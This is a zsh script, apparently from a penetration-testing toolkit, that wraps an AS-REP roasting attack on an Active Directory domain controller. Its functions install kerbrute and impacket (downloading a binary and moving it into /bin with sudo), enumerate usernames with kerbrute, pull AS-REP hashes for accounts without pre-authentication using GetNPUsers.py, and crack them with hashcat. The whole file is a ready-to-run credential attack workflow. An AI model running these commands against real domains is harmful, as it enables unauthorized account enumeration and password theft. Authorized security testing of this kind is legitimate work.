#!/usr/bin/env zsh

############################################################# 
# nb-ad-asrep
#############################################################
nb-ad-asrep-help() {
    cat << "DOC" | bat --plain --language=help

nb-ad-asrep
------------
The nb-ad-asrep namespace contains commands for as-rep roast attack on Active Directory DC server.

Commands
--------
nb-ad-asrep-install        installs dependencies
nb-ad-asrep-enum-users     utilize kerbrute to enumerate usernames
nb-ad-asrep-brute          brute force a password hashes of given users
nb-ad-asrep-crack          crack the password hash

DOC
}

nb-ad-asrep-install() {
  __info "Running $0..."
  __pkgs impacket
  
  # Download kerbrute binary
  curl -LO https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 ~/downloads/
  chmod +x ~/downloads/kerbrute_linux_amd64
  sudo mv ~/downloads/kerbrute_linux_amd64 /bin/kerbrute
  __info "kerbrute is now available"
}

nb-ad-asrep-enum-users() {
  __ask "Enter target AD domain (must also be set in your hosts file)"
  nb-vars-set-domain
	__ask "Enter a users wordlist"
	nb-vars-set-wordlist
  __ask "Enter location of the Domain Controller (KDC) to target"
  # e.g. dc.${__DOMAIN}
  local dc && __askvar dc DOMAIN_CONTROLLER

  print -z "kerbrute userenum --dc $dc -d ${__DOMAIN} ${__WORDLIST} | tee $(__adpath)/kerbrute.txt"
}

nb-ad-asrep-brute() {
	__ask "Enter the IP address of the target domain controller"
	nb-vars-set-rhost
  __ask "Enter target AD domain (must also be set in your hosts file)"
  nb-vars-set-domain
	__ask "Enter a users wordlist"
	nb-vars-set-wordlist

	print -z "GetNPUsers.py -dc-ip ${__RHOST} ${__DOMAIN}.local/ -no-pass -usersfile ${__WORDLIST} | tee $(__adpath)/GetNPUsers.txt"
}

nb-ad-asrep-crack() {
	__ask "Enter the hash"
	__check-hash
	__ask "Enter a password wordlist"
	nb-vars-set-passlist

  print -z "hashcat -m 18200 -a 0 ${__HASH} ${__PASSLIST} | tee -a $(__adpath)/hashcat.txt"
}
